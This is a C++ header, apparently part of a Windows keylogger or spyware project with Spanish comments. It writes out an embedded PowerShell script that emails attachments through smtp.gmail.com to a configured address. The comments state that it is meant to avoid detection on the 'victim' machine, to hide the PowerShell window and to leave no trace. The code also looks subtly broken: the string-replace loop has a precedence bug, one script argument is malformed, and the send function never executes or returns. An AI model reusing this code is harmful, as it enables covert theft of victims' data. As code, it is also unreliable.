#ifndef SendMail_h
#define SendMail_h

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail {

/*Datos de quién y a dónde se va a enviar el correo*/
#define X_EM_TO "@gmail.com"
#define X_EM_FROM "@gmail.com"
#define X_EM_PASS " "

	/*Para poder enviar el correo debemos utilizar sistemas convencionales pero sin ser detectados. Para
	ello hay 3 opciones: utilziar librerias externas, lo cual requiere instalarlas en el ordenador victima
	y no es lo que queremos; crear nuestro propia libreria, lo cual sería muy largo y dificil; o por último
	utilizar el PowerShell*/
	const std::string &PowerShellScript =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		std::string(X_EM_TO) +
		"\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		std::string(X_EM_PASS) +
		"\""
		" -From \"" +
		std::string(X_EM_FROM) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

/*Los borramos para no dejar huella*/
#undef X_EM_TO
#undef X_EM_FROM
#undef X_EM_PASS

	std::string StringReplace(std::string s, const std::string &what, const std::string &with) {

		if (what.empty())
			return s;
		size_t sp = 0;

		while (sp = s.find(what, sp) != std::string::npos)
			s.replace(sp, what.length(), with), sp += with.length();
		return s;
	}

	/*Devuelve si el archivo existe o no*/
	bool CheckFileExist(const std::string &f) {

		std::ifstream file(f);
		return (bool)file;
	}

	/*Crea el script arriba descrito en el path*/
	bool CreateScript() {

		std::ofstream script(IO::GetOurPath(true) + std::string(SCRIPT_NAME));

		if (!script)
			return false;
		script << PowerShellScript;

		if (!script)
			return false;

		script.close();
		return true;
	}

	Timer m_timer;

	int SendMail(const std::string &subject, const std::string &body, const std::string &attachments) {

		bool ok;

		ok = IO::MkDir(IO::GetOurPath(true));
		if (!ok)
			return -1;

		std::string scr_path = IO::GetOurPath(true) + std::string(SCRIPT_NAME);
		if (!CheckFileExist(scr_path))
			ok = CreateScript();
		if (!ok)
			return -2;

		std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
			+ StringReplace(subject, "\"", "\\\"")
			+ "\" -Body \""
			+ StringReplace(body, "\"", "\\\"")
			+ "\" -Att \"" + attachments + "\"";

		SHELLEXECUTEINFO ShExecInfo = { 0 };
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
		ShExecInfo.hwnd = NULL;
		ShExecInfo.lpVerb = "open";
		ShExecInfo.lpFile = "powershell";
		ShExecInfo.lpParameters = param.c_str();
		ShExecInfo.lpDirectory = NULL;
		ShExecInfo.nShow = SW_HIDE; //venta invisible para que el usuario no la vea
		ShExecInfo.hInstApp = NULL; //Para que no salte la venta?


	}
}

#endif // !SendMail_h
